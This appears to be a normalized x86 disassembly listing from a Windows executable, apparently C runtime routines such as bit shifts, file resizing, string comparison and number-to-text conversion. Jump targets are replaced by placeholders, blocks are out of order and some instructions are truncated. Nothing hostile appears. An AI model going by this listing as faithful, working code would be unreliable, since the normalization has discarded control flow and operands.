pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_42d440
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_42d45f
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
and ecx 0xfff7ffff
and eax ecx
push esi
mov esi [ ebp + 0x8 ]
test eax 0xfcf0fce0
je r-xdata
push ecx
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_42fa35
call sub_42fa35
mov [ esi ] eax
jmp r-xdata
call sub_41ccf1
push 0x16
pop esi
mov [ eax ] esi
call sub_41f411
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_42fa35
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_42d4bc
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x10 ]
push esi
mov esi [ ebx + 0xc ]
movzx ecx [ eax ]
mov eax [ esi ]
push edi
mov [ ebp - 0x84 ] ecx
dec eax
je r-xdata
push 0x8
dec eax
je r-xdata
mov ecx [ ebp - 0x84 ]
mov ecx [ ebx + 0x8 ]
cmp ecx 0x10
je r-xdata
push 0x4
jmp r-xdata
dec eax
je r-xdata
push [ esi ]
call sub_42713d
pop ecx
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x40 ]
fld [ esi + 0x10 ]
and eax 0xffffffe3
fstp [ ebp - 0x50 ]
or eax 0x3
mov [ ebp - 0x40 ] eax
cmp ecx 0x16
je r-xdata
pop edi
push ecx
lea eax [ esi + 0x18 ]
push eax
push edi
call sub_426c5b
add esp 0xc
test eax eax
jne r-xdata
push 0x11
jmp r-xdata
dec eax
je r-xdata
push esi
call sub_42d039
pop ecx
test eax eax
jne r-xdata
cmp ecx 0x1d
je r-xdata
push 0x12
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4170bc
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
and [ ebp - 0x40 ] 0xfffffffe
jmp r-xdata
dec eax
dec eax
je r-xdata
lea eax [ esi + 0x18 ]
push eax
lea eax [ esi + 0x8 ]
push eax
push ecx
push edi
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_426e37
add esp 0x18
mov [ esi ] 0x1
jmp r-xdata
dec eax
jne r-xdata
push 0xffff
push ecx
call sub_4271ef
cmp [ esi ] 0x8
pop ecx
pop ecx
je r-xdata
push 0x10
jmp r-xdata
sub_42d5c5
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
push 0x1
push esi
push esi
push edi
mov ebx esi
mov [ ebp - 0x8 ] esi
call sub_421d63
mov ecx edx
mov [ ebp - 0x18 ] eax
and eax ecx
add esp 0x10
mov [ ebp - 0x14 ] ecx
cmp eax 0xffffffff
je r-xdata
call sub_41ccf1
mov eax [ eax ]
push 0x2
push esi
push esi
push edi
call sub_421d63
mov ecx eax
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
sub esi ecx
sbb eax edx
mov [ ebp - 0x4 ] eax
js r-xdata
test eax eax
jg r-xdata
jg r-xdata
push 0x0
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push edi
call sub_421d63
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
push 0x1000
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_421d63
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
test esi esi
jae r-xdata
push 0x8000
push edi
call sub_42d7a3
pop ecx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_41ccf1
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push edi
call sub_42a43c
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov ebx eax
mov eax edx
mov ecx ebx
and ecx eax
mov [ ebp - 0x8 ] eax
cmp ecx 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_41ccf1
mov [ eax ] 0xd
call sub_41ccbd
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
call sub_41ccbd
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
mov eax [ ebp - 0x4 ]
sbb eax edx
mov [ ebp - 0x4 ] eax
js r-xdata
mov eax 0x1000
jmp r-xdata
cmp esi 0x1000
jb r-xdata
or ebx 0xffffffff
or [ ebp - 0x8 ] ebx
call sub_41ccf1
mov [ eax ] 0xd
push [ ebp - 0x10 ]
push edi
call sub_42d7a3
pop ecx
pop ecx
push [ ebp - 0xc ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
jmp r-xdata
jg r-xdata
push eax
push [ ebp - 0xc ]
push edi
call sub_4212e9
add esp 0xc
cmp eax 0xffffffff
je r-xdata
and ebx [ ebp - 0x8 ]
cmp ebx 0xffffffff
je r-xdata
test eax eax
jl r-xdata
test esi esi
je r-xdata
jmp r-xdata
sub_42d779
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
xor eax eax
pop ebp
retn
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
push 0x16
pop eax
pop ebp
retn
sub_42d7a3
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx esi
sar ebx 0x5
and esi 0x1f
shl esi 0x6
push edi
mov edi [ ebx * 4 + rw-data ]
mov cl [ edi + esi + 0x4 ]
movzx eax cl
and eax 0x80
mov [ ebp + 0x8 ] eax
mov al [ edi + esi + 0x24 ]
add al al
movsx edx al
mov eax [ ebp + 0xc ]
sar edx 0x1
cmp eax 0x4000
je r-xdata
or cl 0x80
mov [ edi + esi + 0x4 ] cl
mov eax [ ebx * 4 + rw-data ]
and [ eax + esi + 0x24 ] 0x80
cmp eax 0x8000
je r-xdata
neg edx
sbb edx edx
and edx 0xc000
lea eax [ edx + 0x4000 ]
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and cl 0x7f
mov [ edi + esi + 0x4 ] cl
jmp r-xdata
cmp eax 0x10000
je r-xdata
cmp [ ebp + 0x8 ] 0x0
pop edi
pop esi
pop ebx
jne r-xdata
or cl 0x80
mov [ edi + esi + 0x4 ] cl
mov ecx [ ebx * 4 + rw-data ]
mov al [ ecx + esi + 0x24 ]
and al 0x82
or al 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov [ ecx + esi + 0x24 ] al
jmp r-xdata
cmp eax 0x40000
jne r-xdata
or cl 0x80
mov [ edi + esi + 0x4 ] cl
mov ecx [ ebx * 4 + rw-data ]
mov al [ ecx + esi + 0x24 ]
and al 0x81
or al 0x1
sub_42d870
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push edi
push esi
call sub_42094c
pop ecx
mov ecx [ esi + 0xc ]
mov edi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_41ccf1
mov [ eax ] 0x9
push ebx
xor ebx ebx
test cl 0x1
je r-xdata
call sub_41ccf1
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test cl 0x10
je r-xdata
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
test [ esi + 0xc ] 0x108
je r-xdata
call sub_419282
add eax 0x20
cmp esi eax
je r-xdata
or ecx 0x20
mov [ esi + 0xc ] ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
and ecx 0xfffffffe
mov [ esi ] eax
mov [ esi + 0xc ] ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push edi
mov [ ebp + 0xc ] 0x2
call sub_421207
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov ebx eax
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
lea eax [ edx + 0x2 ]
mov [ esi ] eax
mov eax [ esi + 0x18 ]
sub ecx edx
sub eax 0x2
mov [ ebp + 0xc ] ecx
mov [ esi + 0x4 ] eax
test ecx ecx
jle r-xdata
push edi
call sub_4290d7
pop ecx
test eax eax
jne r-xdata
call sub_419282
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
movzx eax cx
or [ esi + 0xc ] 0x20
cmp edi 0xffffffff
je r-xdata
push ecx
push edx
push edi
call sub_421207
add esp 0xc
mov ebx eax
jmp r-xdata
push esi
call sub_423d3f
pop ecx
pop ebx
mov ecx rw-data
cmp edi 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] cx
jmp r-xdata
push 0x2
push ebx
push ebx
push edi
call sub_421c67
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov ecx edi
mov eax edi
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
cmp ebx [ ebp + 0xc ]
je r-xdata
test [ ecx + 0x4 ] 0x20
je r-xdata
sub_42da10
push ebx
push esi
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
test ebx 0xffffffff
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub ecx edx
test edx 0x3
je r-xdata
lea eax [ edx + ecx ]
and eax 0xfff
cmp eax 0xffc
ja r-xdata
movzx eax [ edx + ecx ]
cmp al [ edx ]
jne r-xdata
mov eax [ edx + ecx ]
cmp eax [ edx ]
jne r-xdata
sbb eax eax
or eax 0x1
pop esi
pop ebx
retn
test eax eax
cmove ebx eax
inc edx
sub ebx 0x1
jbe r-xdata
sub ebx 0x4
jbe r-xdata
test dl 0x3
jne r-xdata
lea esi [ eax - 0x1010101 ]
add edx 0x4
not eax
and eax esi
test eax 0x80808080
je r-xdata
sub_42da88
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42daf3
add esp 0x10
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
mov eax 0x7fffffff
jmp r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_42fdd0
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
mov eax esi
jmp r-xdata
sub_42daf3
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
leave
retn
push ebx
push esi
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_4199d2
mov edi [ ebp + 0x8 ]
mov esi 0x7fffffff
test edi edi
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
jmp r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx esi
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
sub edi ebx
push ecx
push ebx
push edi
call sub_42fdd0
add esp 0xc
mov esi eax
jmp r-xdata
sub esi eax
test esi esi
je r-xdata
cmp esi eax
je r-xdata
movzx eax [ edi + ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41cd5e
mov esi eax
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41cd5e
add esp 0x10
inc ebx
dec [ ebp + 0x10 ]
je r-xdata
sub_42dba2
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jns r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_42dbcb
pop ebp
retn
sub_42dbcb
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
test ecx ecx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
push ebx
push edi
ja r-xdata
call sub_41ccf1
push 0x16
pop esi
mov [ eax ] esi
call sub_41f411
mov eax esi
jmp r-xdata
mov edx [ ebp + 0x18 ]
xor eax eax
test edx edx
mov [ ecx ] ax
setne al
inc eax
cmp [ ebp + 0x10 ] eax
ja r-xdata
call sub_41ccf1
push 0x16
pop esi
pop ebp
retn 0x14
mov eax [ ebp + 0x14 ]
push 0x22
add eax 0xfffffffe
pop esi
cmp eax esi
ja r-xdata
call sub_41ccf1
push 0x22
jmp r-xdata
mov [ eax ] esi
call sub_41f411
mov eax esi
jmp r-xdata
xor eax eax
test edx edx
mov edx [ ebp + 0x8 ]
mov [ ebp + 0x18 ] eax
mov edi ecx
je r-xdata
pop esi
jmp r-xdata
pop edi
pop ebx
mov ecx [ ebp + 0x18 ]
mov ebx edi
push 0x2d
pop eax
mov [ ecx ] ax
xor eax eax
inc eax
lea edi [ ecx + 0x2 ]
mov [ ebp + 0x18 ] eax
neg edx
add eax 0x30
add eax 0x57
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ edi ] ax
add edi 0x2
inc ecx
test edx edx
je r-xdata
xor eax eax
mov [ edi ] ax
sub edi 0x2
xor eax eax
mov [ ecx ] ax
call sub_41ccf1
mov eax edx
xor edx edx
div [ ebp + 0x14 ]
mov [ ebp + 0x8 ] edx
mov edx eax
mov eax [ ebp + 0x8 ]
cmp eax 0x9
jbe r-xdata
movzx ecx [ edi ]
mov ax [ ebx ]
mov [ edi ] ax
mov [ ebx ] cx
sub edi 0x2
add ebx 0x2
cmp ebx edi
jb r-xdata
xor eax eax
sub_42dcbe
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
mov ecx [ ebx + 0x8 ]
mov dx [ ebx + 0xc ]
sub esp 0x20
cmp [ rw-data ] 0x1
jl r-xdata
movzx eax [ ecx ]
test ax ax
jne r-xdata
movzx eax dx
movd xmm0 eax
pshuflw xmm0 xmm0 0x0
pshufd xmm2 xmm0 0x0
cmp ax dx
je r-xdata
xor eax eax
cmp [ ecx ] dx
setne al
dec eax
and eax ecx
jmp r-xdata
movzx eax [ ecx ]
cmp ax dx
je r-xdata
movdqu xmm0 [ ecx ]
pxor xmm1 xmm1
pcmpeqw xmm1 xmm0
pcmpeqw xmm0 xmm2
por xmm1 xmm0
pmovmskb eax xmm1
test eax eax
jne r-xdata
add ecx 0x2
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
mov eax ecx
test ax ax
je r-xdata
bsf eax eax
mov [ ebp - 0x4 ] eax
add ecx eax
jmp r-xdata
add ecx 0x10
jmp r-xdata
xor eax eax
jmp r-xdata
add ecx 0x2
jmp r-xdata
mov eax ecx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
sub_42dd6c
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
push ebx
movzx eax [ ecx + 0xa ]
mov edx eax
and eax 0x8000
mov [ ebp - 0x44 ] eax
mov eax [ ecx + 0x6 ]
mov [ ebp - 0x10 ] eax
mov eax [ ecx + 0x2 ]
mov [ ebp - 0xc ] eax
movzx eax [ ecx ]
and edx 0x7fff
push esi
sub edx 0x3fff
push edi
mov edi [ ebp + 0xc ]
shl eax 0x10
xor ebx ebx
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x8 ] eax
cmp edx 0xffffc001
jne r-xdata
mov eax [ rw-data ]
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
dec eax
movsd [ edi ] [ esi ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x34 ] eax
mov eax ecx
cdq
push 0x1f
movsd [ edi ] [ esi ]
pop esi
and edx esi
add edx eax
sar edx 0x5
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x3c ] edx
and ecx 0x8000001f
jns r-xdata
mov esi ebx
mov eax ebx
sub esi ecx
xor eax eax
inc eax
mov ecx esi
shl eax cl
push 0x3
or edi 0xffffffff
mov [ ebp - 0x30 ] esi
pop esi
test [ ebp + edx * 4 - 0x10 ] eax
je r-xdata
dec ecx
or ecx 0xffffffe0
inc ecx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
inc eax
cmp eax 0x3
jl r-xdata
mov eax edi
shl eax cl
and [ ebp + edx * 4 - 0x10 ] eax
lea eax [ edx + 0x1 ]
cmp eax esi
jge r-xdata
mov eax edi
shl eax cl
not eax
test [ ebp + edx * 4 - 0x10 ] eax
jmp r-xdata
mov edi [ ebp - 0x40 ]
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x20 ]
cmp [ ebp - 0x2c ] ebx
je r-xdata
lea edi [ ebp - 0x10 ]
mov ecx esi
lea edi [ edi + eax * 4 ]
sub ecx eax
xor eax eax
[ edi ]
or edi 0xffffffff
jne r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ edi + 0x4 ] esi
mov [ edi ] eax
jmp r-xdata
push 0x1f
pop eax
sub eax [ rw-data ]
mov ecx eax
mov eax [ ebp - 0x44 ]
shl esi cl
neg eax
sbb eax eax
and eax 0x80000000
or esi eax
mov eax [ rw-data ]
or esi [ ebp - 0x10 ]
cmp eax 0x40
jne r-xdata
mov edx [ rw-data ]
mov eax edx
sub eax [ rw-data ]
cmp ecx eax
jge r-xdata
inc ecx
mov eax [ ebp - 0x34 ]
cdq
push 0x1f
pop ecx
and edx ecx
add edx eax
mov eax [ ebp - 0x34 ]
sar edx 0x5
and eax 0x8000001f
jns r-xdata
inc edx
cmp edx esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
mov [ edi ] esi
cmp ecx edx
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
sub ecx eax
xor eax eax
inc eax
shl eax cl
push 0xffffffff
mov [ ebp - 0x2c ] ebx
pop edi
mov [ ebp - 0x38 ] eax
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx [ ebp - 0x38 ]
add ecx eax
mov [ ebp - 0x28 ] ecx
cmp ecx eax
mov eax [ ebp - 0x28 ]
mov ecx ebx
jb r-xdata
dec eax
or eax 0xffffffe0
inc eax
cmp [ ebp + edx * 4 - 0x10 ] ebx
jmp r-xdata
cmp ecx [ rw-data ]
jl r-xdata
sub edx [ ebp - 0x24 ]
lea esi [ ebp - 0x1c ]
mov [ ebp - 0x30 ] edx
mov eax edx
cdq
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
and edx 0x1f
add eax edx
sar eax 0x5
movsd [ edi ] [ esi ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
and eax 0x8000001f
jns r-xdata
push 0x2
pop ebx
jmp r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x2c ] ecx
cmp eax [ ebp - 0x38 ]
jae r-xdata
mov edx [ ebp - 0x3c ]
mov esi [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
add esi ecx
mov ecx [ rw-data ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x28 ] eax
and ecx 0x8000001f
jns r-xdata
mov ecx [ rw-data ]
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x34 ] eax
and ecx 0x8000001f
jns r-xdata
mov [ ebp - 0x30 ] eax
or edi 0xffffffff
mov eax edi
mov edi [ ebp - 0x30 ]
mov ecx edi
shl eax cl
push 0x20
mov [ ebp - 0x20 ] ebx
not eax
mov [ ebp - 0x28 ] eax
pop eax
sub eax edi
push 0x3
mov [ ebp - 0x38 ] eax
pop esi
dec eax
or eax 0xffffffe0
inc eax
mov ecx [ ebp - 0x30 ]
test ecx ecx
je r-xdata
dec edx
mov [ ebp + edx * 4 - 0xc ] eax
js r-xdata
shl edi cl
push 0x20
mov [ ebp - 0x20 ] ebx
mov esi ebx
pop eax
mov ebx ecx
sub eax ebx
mov [ ebp - 0x24 ] ecx
not edi
mov [ ebp - 0x24 ] eax
dec ecx
or ecx 0xffffffe0
inc ecx
or edi 0xffffffff
shl edi cl
push 0x20
pop eax
sub eax ecx
mov [ ebp - 0x38 ] ecx
not edi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] eax
dec ecx
or ecx 0xffffffe0
inc ecx
mov edx [ ebp + ebx * 4 - 0x10 ]
mov eax edx
and eax [ ebp - 0x28 ]
mov ecx edi
shr edx cl
mov ecx [ ebp - 0x38 ]
shl eax cl
or edx [ ebp - 0x20 ]
inc ebx
mov [ ebp + ebx * 4 - 0x14 ] edx
mov [ ebp - 0x20 ] eax
cmp ebx esi
jl r-xdata
mov eax [ ebp - 0x3c ]
shl eax 0x2
lea edx [ ebp - 0x8 ]
push 0x2
sub edx eax
mov eax [ ebp - 0x3c ]
xor ebx ebx
pop ecx
or edi 0xffffffff
or edi 0xffffffff
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx ebx
lea edi [ eax + 0x1 ]
cmp edi eax
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] edi
mov eax edi
jb r-xdata
mov edx [ ebp + esi * 4 - 0x10 ]
mov eax edx
mov ecx ebx
shr edx cl
mov ecx [ ebp - 0x24 ]
and eax edi
shl eax cl
or edx [ ebp - 0x20 ]
inc esi
mov [ ebp + esi * 4 - 0x14 ] edx
mov [ ebp - 0x20 ] eax
cmp esi 0x3
jl r-xdata
mov edi [ ebp - 0x28 ]
mov esi [ ebp - 0x38 ]
mov eax edi
shl eax 0x2
lea edx [ ebp - 0x8 ]
push 0x2
sub edx eax
pop ecx
xor ebx ebx
mov edx [ ebp + ebx * 4 - 0x10 ]
mov eax edx
shr edx cl
mov ecx [ ebp - 0x28 ]
and eax edi
shl eax cl
or edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x38 ]
mov [ ebp + ebx * 4 - 0x10 ] edx
inc ebx
mov [ ebp - 0x20 ] eax
cmp ebx esi
jl r-xdata
mov esi [ ebp - 0x34 ]
mov eax esi
shl eax 0x2
lea edx [ ebp - 0x8 ]
push 0x2
sub edx eax
pop ecx
xor ebx ebx
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
mov eax [ ebp - 0x3c ]
jmp r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x2c ] ecx
cmp eax 0x1
jae r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
cmp ecx eax
jl r-xdata
mov ecx [ ebp - 0x34 ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add edx eax
sar edx 0x5
mov [ ebp - 0x2c ] edx
and ecx 0x8000001f
jns r-xdata
sub edx 0x4
dec ecx
jns r-xdata
dec edx
mov [ ebp + edx * 4 - 0xc ] eax
jns r-xdata
cmp ecx edi
jl r-xdata
sub edx 0x4
dec ecx
jns r-xdata
cmp ecx esi
jl r-xdata
mov esi [ rw-data ]
add esi [ rw-data ]
xor ebx ebx
inc ebx
jmp r-xdata
sub edx 0x4
dec ecx
jns r-xdata
push 0x1f
pop eax
sub eax ecx
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x30 ]
xor eax eax
inc eax
shl eax cl
test [ ebp + edx * 4 - 0x10 ] eax
je r-xdata
dec ecx
or ecx 0xffffffe0
inc ecx
mov eax edi
shl eax cl
and [ ebp + edx * 4 - 0x10 ] eax
inc edx
cmp edx esi
jge r-xdata
mov eax edi
shl eax cl
not eax
test [ ebp + edx * 4 - 0x10 ] eax
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x28 ] eax
and ecx 0x8000001f
jns r-xdata
lea edi [ ebp - 0x10 ]
mov ecx esi
lea edi [ edi + edx * 4 ]
sub ecx edx
xor eax eax
[ edi ]
or edi 0xffffffff
jne r-xdata
mov [ ebp - 0x24 ] ecx
shl edi cl
mov eax ebx
push 0x20
mov [ ebp - 0x20 ] ebx
mov ebx [ ebp - 0x24 ]
pop ecx
sub ecx ebx
not edi
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x24 ] ecx
dec ecx
or ecx 0xffffffe0
inc ecx
mov edi [ ebp - 0x34 ]
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add edx eax
sar edx 0x5
and edi 0x8000001f
jns r-xdata
inc edx
cmp edx esi
jl r-xdata
mov edx [ ebp + eax * 4 - 0x10 ]
mov eax edx
mov ecx ebx
shr edx cl
mov ecx [ ebp - 0x34 ]
and eax edi
or edx [ ebp - 0x20 ]
mov [ ebp + ecx * 4 - 0x10 ] edx
mov ecx [ ebp - 0x24 ]
shl eax cl
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
inc eax
mov [ ebp - 0x34 ] eax
cmp eax esi
jl r-xdata
mov esi [ ebp - 0x28 ]
mov eax esi
shl eax 0x2
lea edx [ ebp - 0x8 ]
push 0x2
sub edx eax
pop ecx
xor ebx ebx
mov eax [ ebp + edx * 4 - 0x10 ]
sub ecx edi
xor edi edi
inc edi
shl edi cl
push 0xffffffff
mov ecx ebx
mov [ ebp - 0x24 ] edi
add edi eax
mov [ ebp - 0x20 ] edi
cmp edi eax
mov eax [ ebp - 0x20 ]
pop edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + edx * 4 - 0x10 ] ebx
jmp r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
xor ecx ecx
inc ecx
cmp eax [ ebp - 0x24 ]
jae r-xdata
mov edx [ ebp - 0x2c ]
cmp ecx esi
jl r-xdata
jmp r-xdata
sub edx 0x4
dec ecx
jns r-xdata
mov ecx [ ebp - 0x30 ]
test ecx ecx
je r-xdata
dec edx
mov [ ebp + edx * 4 - 0xc ] eax
js r-xdata
mov esi ebx
jmp r-xdata
or edi 0xffffffff
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx ebx
lea edi [ eax + 0x1 ]
cmp edi eax
mov [ ebp - 0x20 ] edi
mov eax edi
jb r-xdata
xor ecx ecx
inc ecx
cmp eax 0x1
jae r-xdata
dec edx
mov [ ebp + edx * 4 - 0xc ] eax
jns r-xdata
sub_42e2dc
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
push ebx
movzx eax [ ecx + 0xa ]
mov edx eax
and eax 0x8000
mov [ ebp - 0x44 ] eax
mov eax [ ecx + 0x6 ]
mov [ ebp - 0x10 ] eax
mov eax [ ecx + 0x2 ]
mov [ ebp - 0xc ] eax
movzx eax [ ecx ]
and edx 0x7fff
push esi
sub edx 0x3fff
push edi
mov edi [ ebp + 0xc ]
shl eax 0x10
xor ebx ebx
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x8 ] eax
cmp edx 0xffffc001
jne r-xdata
mov eax [ rw-data ]
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
dec eax
